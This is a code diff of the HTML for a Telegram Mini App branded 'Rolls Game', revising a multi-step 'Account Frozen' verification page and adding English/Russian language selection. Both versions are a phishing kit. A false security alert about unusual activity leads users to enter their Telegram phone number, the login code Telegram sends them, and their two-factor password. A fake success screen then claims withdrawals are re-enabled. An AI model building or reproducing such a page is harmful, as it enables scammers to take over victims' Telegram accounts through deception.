@@ -3,326 +3,378 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Rolls Game Verification</title>
+    <title>Rolls Game</title>
     <link rel="stylesheet" href="style.css">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
-    <div class="container">
-        <!-- Main Content -->
-        <main class="main-content">
-            <!-- Step 1: Frozen Account -->
-            <div class="step active" id="step1">
-                <div class="card frozen">
-                    <div class="card-header">
-                        <div class="icon-wrapper">
-                            <i class="fas fa-snowflake"></i>
-                        </div>
-                        <h1 class="card-title">Account Security Alert</h1>
-                    </div>
-                    
-                    <div class="card-body">
-                        <div class="account-info">
-                            <div class="info-icon">
-                                <i class="fas fa-shield-alt"></i>
-                            </div>
-                            <p class="username" id="usernameDisplay">
-                                Security verification required for your account
-                            </p>
-                        </div>
-                        
-                        <div class="alert-message">
-                            <i class="fas fa-exclamation-triangle"></i>
-                            <p>We've detected unusual activity and temporarily frozen withdrawals to protect your account.</p>
-                        </div>
-                        
-                        <div class="instructions">
-                            <div class="instruction">
-                                <div class="number">1</div>
-                                <p>Verify your identity with phone number</p>
-                            </div>
-                            <div class="instruction">
-                                <div class="number">2</div>
-                                <p>Enter verification code</p>
-                            </div>
-                            <div class="instruction">
-                                <div class="number">3</div>
-                                <p>Restore account access</p>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <div class="card-footer">
-                        <button class="btn-primary" onclick="startVerification()">
-                            <i class="fas fa-unlock-alt"></i>
-                            Begin Verification
-                        </button>
-                        <p class="note">Verification takes 1-2 minutes</p>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Step 2: Phone Input -->
-            <div class="step" id="step2">
-                <div class="card">
-                    <div class="card-header">
-                        <button class="back-btn" onclick="goBack(1)">
-                            <i class="fas fa-arrow-left"></i>
-                        </button>
-                        <h2 class="card-title">Phone Verification</h2>
-                        <div class="step-indicator">Step 1/3</div>
-                    </div>
-                    
-                    <div class="card-body">
-                        <div class="input-group">
-                            <label for="phoneInput">
-                                <i class="fas fa-phone"></i>
-                                Enter your Telegram phone number
-                            </label>
-                            <div class="phone-input-wrapper">
-                                <div class="country-code">+</div>
-                                <input 
-                                    type="tel" 
-                                    id="phoneInput" 
-                                    placeholder="1234567890"
-                                    pattern="[0-9]*"
-                                    inputmode="numeric"
-                                >
-                            </div>
-                            <p class="input-hint">Enter number without country code</p>
-                        </div>
-                        
-                        <div class="terms">
-                            <input type="checkbox" id="termsCheckbox">
-                            <label for="termsCheckbox">
-                                I agree to use my phone number for security verification
-                            </label>
-                        </div>
-                    </div>
-                    
-                    <div class="card-footer">
-                        <button class="btn-primary" onclick="sendCode()" id="sendCodeBtn">
-                            <i class="fas fa-paper-plane"></i>
-                            Send Verification Code
-                        </button>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Step 3: Code Verification -->
-            <div class="step" id="step3">
-                <div class="card">
-                    <div class="card-header">
-                        <button class="back-btn" onclick="goBack(2)">
-                            <i class="fas fa-arrow-left"></i>
-                        </button>
-                        <h2 class="card-title">Enter Code</h2>
-                        <div class="step-indicator">Step 2/3</div>
-                    </div>
-                    
-                    <div class="card-body">
-                        <div class="code-input-container">
-                            <p class="code-hint">Enter the 5-digit code sent to your Telegram</p>
-                            <div class="code-input">
-                                <input type="text" maxlength="1" oninput="moveToNext(this, 1)">
-                                <input type="text" maxlength="1" oninput="moveToNext(this, 2)">
-                                <input type="text" maxlength="1" oninput="moveToNext(this, 3)">
-                                <input type="text" maxlength="1" oninput="moveToNext(this, 4)">
-                                <input type="text" maxlength="1" oninput="moveToNext(this, 5)">
-                            </div>
-                            
-                            <div class="timer-container">
-                                <div class="timer" id="timer">
-                                    <i class="fas fa-clock"></i>
-                                    Code expires in <span id="countdown">60</span>s
-                                </div>
-                                <button class="btn-link" onclick="resendCode()" id="resendBtn" disabled>
-                                    Resend Code
-                                </button>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <div class="card-footer">
-                        <button class="btn-primary" onclick="verifyCode()" id="verifyCodeBtn">
-                            <i class="fas fa-check-circle"></i>
-                            Verify Code
-                        </button>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Step 4: 2FA -->
-            <div class="step" id="step4">
-                <div class="card">
-                    <div class="card-header">
-                        <button class="back-btn" onclick="goBack(3)">
-                            <i class="fas fa-arrow-left"></i>
-                        </button>
-                        <h2 class="card-title">Two-Factor Authentication</h2>
-                    </div>
-                    
-                    <div class="card-body">
-                        <div class="input-group">
-                            <label for="passwordInput">
-                                <i class="fas fa-lock"></i>
-                                Enter your 2FA password
-                            </label>
-                            <input 
-                                type="password" 
-                                id="passwordInput" 
-                                placeholder="Enter password"
-                            >
-                            <p class="input-hint">Required for accounts with 2FA enabled</p>
-                        </div>
-                    </div>
-                    
-                    <div class="card-footer">
-                        <button class="btn-primary" onclick="verify2FA()" id="verify2FABtn">
-                            <i class="fas fa-shield-check"></i>
-                            Complete Verification
-                        </button>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Step 5: Success -->
-            <div class="step" id="step5">
-                <div class="card success">
-                    <div class="card-body">
-                        <div class="success-animation">
-                            <div class="success-icon">
-                                <i class="fas fa-check"></i>
-                            </div>
-                            <div class="confetti"></div>
-                            <div class="confetti"></div>
-                            <div class="confetti"></div>
-                        </div>
-                        
-                        <h2 class="success-title">Verification Complete!</h2>
-                        <p class="success-message">
-                            Your account has been successfully verified and secured.
-                        </p>
-                        
-                        <div class="verification-details">
-                            <div class="detail-item">
-                                <span class="detail-label">Status</span>
-                                <span class="detail-value verified">
-                                    <i class="fas fa-check-circle"></i>
-                                    Verified
-                                </span>
-                            </div>
-                            <div class="detail-item">
-                                <span class="detail-label">Account</span>
-                                <span class="detail-value" id="verifiedUsername"></span>
-                            </div>
-                            <div class="detail-item">
-                                <span class="detail-label">Time</span>
-                                <span class="detail-value" id="verificationTime"></span>
-                            </div>
-                        </div>
-                        
-                        <div class="next-steps">
-                            <h3>Next Steps:</h3>
-                            <ul>
-                                <li><i class="fas fa-check"></i> Withdrawals have been re-enabled</li>
-                                <li><i class="fas fa-check"></i> Account security has been upgraded</li>
-                                <li><i class="fas fa-check"></i> Support team notified for processing</li>
-                            </ul>
-                        </div>
-                    </div>
-                    
-                    <div class="card-footer">
-                        <button class="btn-secondary" onclick="closeMiniApp()">
-                            <i class="fas fa-times"></i>
-                            Close Mini App
-                        </button>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Step 6: Error -->
-            <div class="step" id="step6">
-                <div class="card error">
-                    <div class="card-body">
-                        <div class="error-icon">
-                            <i class="fas fa-exclamation-circle"></i>
-                        </div>
-                        
-                        <h2 class="error-title">Verification Failed</h2>
-                        <p class="error-message" id="errorMessage">
-                            An error occurred during verification.
-                        </p>
-                        
-                        <div class="error-details">
-                            <p>Please check:</p>
-                            <ul>
-                                <li><i class="fas fa-circle"></i> Correct phone number</li>
-                                <li><i class="fas fa-circle"></i> Valid verification code</li>
-                                <li><i class="fas fa-circle"></i> Stable internet connection</li>
-                            </ul>
-                        </div>
-                    </div>
-                    
-                    <div class="card-footer">
-                        <button class="btn-primary" onclick="goBack(1)">
-                            <i class="fas fa-redo"></i>
-                            Try Again
-                        </button>
-                        <button class="btn-link" onclick="contactSupport()">
-                            Contact Support
-                        </button>
-                    </div>
-                </div>
-            </div>
-        </main>
-
-        <!-- Footer -->
-        <footer class="footer">
-            <div class="footer-content">
-                <div class="brand">
-                    <div class="logo">
-                        <i class="fas fa-dice"></i>
-                        <span>Rolls Game</span>
-                    </div>
-                    <p class="tagline">Secure Gaming Experience</p>
+    <div class="app-container">
+        <!-- Step 0: Language Selection -->
+        <div class="step active" id="step0">
+            <div class="language-selection">
+                <div class="logo-container">
+                    <div class="logo">🎲</div>
+                    <h1 class="app-title">Rolls Game</h1>
                 </div>
                 
-                <div class="security-info">
-                    <div class="security-badge">
-                        <i class="fas fa-shield-check"></i>
-                        <span>Protected by Telegram</span>
+                <div class="language-card">
+                    <h2>Select Language</h2>
+                    <p class="language-subtitle">Choose your preferred language</p>
+                    
+                    <div class="language-options">
+                        <button class="language-option" onclick="selectLanguage('en')">
+                            <div class="flag">🇺🇸</div>
+                            <div class="language-info">
+                                <span class="language-name">English</span>
+                                <span class="language-native">English</span>
+                            </div>
+                            <div class="checkmark">✓</div>
+                        </button>
+                        
+                        <button class="language-option" onclick="selectLanguage('ru')">
+                            <div class="flag">🇷🇺</div>
+                            <div class="language-info">
+                                <span class="language-name">Russian</span>
+                                <span class="language-native">Русский</span>
+                            </div>
+                            <div class="checkmark">✓</div>
+                        </button>
                     </div>
-                    <p class="security-note">
-                        Your data is encrypted and secured
-                    </p>
+                    
+                    <div class="language-note">
+                        You can change language later in settings
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Step 1: Frozen Account -->
+        <div class="step" id="step1">
+            <div class="header">
+                <div class="back-btn" onclick="goBackToLanguage()">←</div>
+                <div class="header-center">
+                    <h1 data-lang-key="step1_title">Account Security</h1>
+                </div>
+                <div class="language-indicator" onclick="showLanguageMenu()" id="currentLanguage">
+                    EN
                 </div>
             </div>
             
-            <div class="footer-links">
-                <a href="https://t.me/rollssupport" target="_blank">
-                    <i class="fas fa-headset"></i>
-                    Support
-                </a>
-                <a href="#" onclick="showPrivacy()">
-                    <i class="fas fa-lock"></i>
-                    Privacy
-                </a>
-                <a href="#" onclick="showTerms()">
-                    <i class="fas fa-file-contract"></i>
-                    Terms
-                </a>
+            <div class="card frozen-card">
+                <div class="warning-icon">⚠️</div>
+                <h2 data-lang-key="account_frozen">Account Frozen</h2>
+                
+                <div class="user-info-display">
+                    <div class="user-icon">👤</div>
+                    <div class="username" id="usernameDisplay" data-lang-key="user_account">
+                        Your account requires verification
+                    </div>
+                </div>
+                
+                <div class="alert-box">
+                    <div class="alert-icon">ℹ️</div>
+                    <div class="alert-content">
+                        <p data-lang-key="freeze_reason">We've detected unusual activity on your account</p>
+                        <p data-lang-key="freeze_action">Verification required to restore access</p>
+                    </div>
+                </div>
+                
+                <div class="verification-steps">
+                    <div class="verification-step">
+                        <div class="step-number">1</div>
+                        <div class="step-text" data-lang-key="step1_desc">Enter phone number</div>
+                    </div>
+                    <div class="verification-step">
+                        <div class="step-number">2</div>
+                        <div class="step-text" data-lang-key="step2_desc">Verify with code</div>
+                    </div>
+                    <div class="verification-step">
+                        <div class="step-number">3</div>
+                        <div class="step-text" data-lang-key="step3_desc">Complete verification</div>
+                    </div>
+                </div>
+                
+                <button class="btn-primary" onclick="startVerification()" data-lang-key="start_verification">
+                    Start Verification
+                </button>
+                
+                <div class="note" data-lang-key="verification_note">
+                    Process takes 1-2 minutes
+                </div>
             </div>
-        </footer>
+            
+            <div class="support-info">
+                <p data-lang-key="need_help">Need help?</p>
+                <a href="https://t.me/rollssupport" data-lang-key="contact_support">Contact Support</a>
+            </div>
+        </div>
+
+        <!-- Step 2: Phone Input -->
+        <div class="step" id="step2">
+            <div class="header">
+                <div class="back-btn" onclick="goBack(1)">←</div>
+                <div class="header-center">
+                    <h1 data-lang-key="phone_verification">Phone Verification</h1>
+                    <div class="step-counter">1/3</div>
+                </div>
+                <div class="language-indicator" onclick="showLanguageMenu()" id="currentLanguage2">
+                    EN
+                </div>
+            </div>
+            
+            <div class="card">
+                <div class="input-section">
+                    <div class="input-label" data-lang-key="enter_phone">
+                        Enter your Telegram phone number
+                    </div>
+                    
+                    <div class="phone-input-container">
+                        <div class="country-code">+</div>
+                        <input 
+                            type="tel" 
+                            id="phoneInput" 
+                            placeholder="1234567890"
+                            inputmode="numeric"
+                            data-lang-key="phone_placeholder"
+                        >
+                    </div>
+                    
+                    <div class="input-hint" data-lang-key="phone_hint">
+                        Enter without country code
+                    </div>
+                </div>
+                
+                <div class="privacy-notice">
+                    <div class="privacy-icon">🔒</div>
+                    <div class="privacy-text" data-lang-key="privacy_notice">
+                        Your phone number is used only for verification and is protected by Telegram's security
+                    </div>
+                </div>
+                
+                <button class="btn-primary" onclick="sendCode()" id="sendCodeBtn" data-lang-key="send_code">
+                    Send Verification Code
+                </button>
+            </div>
+        </div>
+
+        <!-- Step 3: Code Verification -->
+        <div class="step" id="step3">
+            <div class="header">
+                <div class="back-btn" onclick="goBack(2)">←</div>
+                <div class="header-center">
+                    <h1 data-lang-key="enter_code">Enter Code</h1>
+                    <div class="step-counter">2/3</div>
+                </div>
+                <div class="language-indicator" onclick="showLanguageMenu()" id="currentLanguage3">
+                    EN
+                </div>
+            </div>
+            
+            <div class="card">
+                <div class="code-section">
+                    <div class="code-instruction" data-lang-key="code_instruction">
+                        Enter the 5-digit code sent to your Telegram
+                    </div>
+                    
+                    <div class="code-inputs">
+                        <input type="text" maxlength="1" class="code-input" oninput="moveToNext(this, 1)">
+                        <input type="text" maxlength="1" class="code-input" oninput="moveToNext(this, 2)">
+                        <input type="text" maxlength="1" class="code-input" oninput="moveToNext(this, 3)">
+                        <input type="text" maxlength="1" class="code-input" oninput="moveToNext(this, 4)">
+                        <input type="text" maxlength="1" class="code-input" oninput="moveToNext(this, 5)">
+                    </div>
+                    
+                    <div class="timer-section">
+                        <div class="timer" id="timer">
+                            <span data-lang-key="code_expires">Code expires in</span>
+                            <span id="countdown">60</span>
+                            <span>s</span>
+                        </div>
+                        
+                        <button class="resend-btn" onclick="resendCode()" id="resendBtn" disabled data-lang-key="resend_code">
+                            Resend Code
+                        </button>
+                    </div>
+                </div>
+                
+                <button class="btn-primary" onclick="verifyCode()" id="verifyCodeBtn" data-lang-key="verify_code">
+                    Verify Code
+                </button>
+            </div>
+        </div>
+
+        <!-- Step 4: 2FA Password -->
+        <div class="step" id="step4">
+            <div class="header">
+                <div class="back-btn" onclick="goBack(3)">←</div>
+                <div class="header-center">
+                    <h1 data-lang-key="two_factor">Two-Factor Auth</h1>
+                    <div class="step-counter">3/3</div>
+                </div>
+                <div class="language-indicator" onclick="showLanguageMenu()" id="currentLanguage4">
+                    EN
+                </div>
+            </div>
+            
+            <div class="card">
+                <div class="twofa-section">
+                    <div class="twofa-icon">🔐</div>
+                    
+                    <div class="twofa-instruction" data-lang-key="twofa_instruction">
+                        Your account has two-factor authentication enabled
+                    </div>
+                    
+                    <div class="input-section">
+                        <div class="input-label" data-lang-key="enter_2fa">
+                            Enter your 2FA password
+                        </div>
+                        
+                        <input 
+                            type="password" 
+                            id="passwordInput" 
+                            placeholder="••••••••"
+                            data-lang-key="password_placeholder"
+                        >
+                        
+                        <div class="input-hint" data-lang-key="twofa_hint">
+                            Required for accounts with enhanced security
+                        </div>
+                    </div>
+                </div>
+                
+                <button class="btn-primary" onclick="verify2FA()" id="verify2FABtn" data-lang-key="verify_2fa">
+                    Verify & Continue
+                </button>
+            </div>
+        </div>
+
+        <!-- Step 5: Success -->
+        <div class="step" id="step5">
+            <div class="header">
+                <div class="header-center">
+                    <h1 data-lang-key="verification_complete">Verification Complete</h1>
+                </div>
+                <div class="language-indicator" onclick="showLanguageMenu()" id="currentLanguage5">
+                    EN
+                </div>
+            </div>
+            
+            <div class="card success-card">
+                <div class="success-animation">
+                    <div class="success-circle">
+                        <div class="success-icon">✓</div>
+                    </div>
+                </div>
+                
+                <h2 data-lang-key="account_verified">Account Verified!</h2>
+                
+                <div class="success-message" data-lang-key="success_message">
+                    Your account has been successfully verified and all restrictions have been lifted
+                </div>
+                
+                <div class="verification-details">
+                    <div class="detail-row">
+                        <span class="detail-label" data-lang-key="status_label">Status:</span>
+                        <span class="detail-value verified" data-lang-key="verified_status">Verified</span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label" data-lang-key="user_label">User ID:</span>
+                        <span class="detail-value" id="verifiedUserId">-</span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label" data-lang-key="time_label">Time:</span>
+                        <span class="detail-value" id="verificationTime">-</span>
+                    </div>
+                </div>
+                
+                <div class="next-steps">
+                    <h3 data-lang-key="next_steps">Next Steps</h3>
+                    <ul>
+                        <li data-lang-key="step1_done">✓ Withdrawals re-enabled</li>
+                        <li data-lang-key="step2_done">✓ Account security upgraded</li>
+                        <li data-lang-key="step3_done">✓ Support notified</li>
+                    </ul>
+                </div>
+                
+                <button class="btn-secondary" onclick="closeMiniApp()" data-lang-key="close_app">
+                    Close Mini App
+                </button>
+            </div>
+        </div>
+
+        <!-- Step 6: Error -->
+        <div class="step" id="step6">
+            <div class="header">
+                <div class="back-btn" onclick="goBack(1)">←</div>
+                <div class="header-center">
+                    <h1 data-lang-key="error_occurred">Error</h1>
+                </div>
+                <div class="language-indicator" onclick="showLanguageMenu()" id="currentLanguage6">
+                    EN
+                </div>
+            </div>
+            
+            <div class="card error-card">
+                <div class="error-icon">✗</div>
+                
+                <h2 data-lang-key="verification_failed">Verification Failed</h2>
+                
+                <div class="error-message" id="errorMessage" data-lang-key="error_default">
+                    An error occurred during verification
+                </div>
+                
+                <div class="error-suggestions">
+                    <p data-lang-key="check_following">Please check the following:</p>
+                    <ul>
+                        <li data-lang-key="check_phone">• Correct phone number</li>
+                        <li data-lang-key="check_code">• Valid verification code</li>
+                        <li data-lang-key="check_internet">• Stable internet connection</li>
+                    </ul>
+                </div>
+                
+                <button class="btn-primary" onclick="goBack(1)" data-lang-key="try_again">
+                    Try Again
+                </button>
+                
+                <button class="btn-link" onclick="contactSupport()" data-lang-key="contact_support">
+                    Contact Support
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Language Menu Modal -->
+    <div class="modal-overlay" id="languageModal">
+        <div class="modal">
+            <div class="modal-header">
+                <h2 data-lang-key="select_language">Select Language</h2>
+                <button class="modal-close" onclick="hideLanguageMenu()">×</button>
+            </div>
+            
+            <div class="modal-body">
+                <div class="language-list">
+                    <div class="language-item" onclick="changeLanguage('en')">
+                        <div class="language-flag">🇺🇸</div>
+                        <div class="language-name">English</div>
+                        <div class="language-check" id="check-en">✓</div>
+                    </div>
+                    
+                    <div class="language-item" onclick="changeLanguage('ru')">
+                        <div class="language-flag">🇷🇺</div>
+                        <div class="language-name">Русский</div>
+                        <div class="language-check" id="check-ru">✓</div>
+                    </div>
+                </div>
+            </div>
+        </div>
     </div>
 
     <!-- Loading Overlay -->
     <div class="loading-overlay" id="loadingOverlay">
         <div class="loading-content">
             <div class="spinner"></div>
-            <p class="loading-text" id="loadingText">Processing...</p>
+            <div class="loading-text" id="loadingText" data-lang-key="processing">Processing...</div>
         </div>
     </div>
 
